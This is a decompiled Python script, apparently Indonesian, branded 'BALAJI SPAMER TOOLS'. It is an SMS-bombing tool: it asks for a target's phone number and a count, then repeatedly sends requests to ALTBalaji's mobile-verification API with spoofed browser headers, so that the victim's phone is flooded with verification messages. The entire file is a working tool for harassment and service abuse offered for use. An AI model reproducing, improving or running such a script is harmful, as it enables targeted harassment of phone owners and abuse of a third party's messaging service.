# Success decompile marshal python 3.7.X
# At: Tue Dec 31 05:42:05 2019
# By KANG-NEWBIE
import os, requests, json, sys, time

class bomz:

    def __init__(self):
        self.u = 'https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=ID'
        self.unum()

    def unum(self):
        codneg = input('Kode Negara (Tanpa +): ')
        nomtar = input(f"Nomor Target : +{codneg} ")
        jumbom = int(input('Jumlah Bom: '))
        for d in range(jumbom):
            res = self.send(codneg, nomtar)
            if '{"status":"ok"}' in res:
                print(f"{d + 1}. Sukses")
            else:
                print(f"{d + 1}. Gagal\n- Detail: {res}")
            time.sleep(1)

    def send(self, codneg, nomtar):
        datajes = {'country_code':codneg,  'phone_number':nomtar}
        headex = {'Connection':'keep-alive',  'Content-Length':f"{len(str(datajes))}", 
         'Accept':'application/json, text/plain, */*', 
         'Origin':'https://lite.altbalaji.com', 
         'Save-Data':'on', 
         'User-Agent':'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.89 Mobile Safari/537.36', 
         'Content-Type':'application/json;charset=UTF-8', 
#         'Referer':'https://lite.altbalaji.com/subscribe?progress=input', 
         'Accept-Encoding':'gzip, deflate, br', 
         'Accept-Language':'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6'}
        req = requests.post((self.u), data=(json.dumps(datajes)), headers=headex)
        return req.text


try:
    os.system('clear')
    print('\n\t# BALAJI SPAMER TOOLS #\n\t    [ 0pxDarkIT ] \n\t')
    bomz()
    while True:
        pil = input('\nCoba Lagi (y/n)?')
        if pil.lower() == 'n':
            sys.exit('Terminated')
        else:
            print()
            bomz()

except Exception as Err:
    print(f"Err: {Err}")

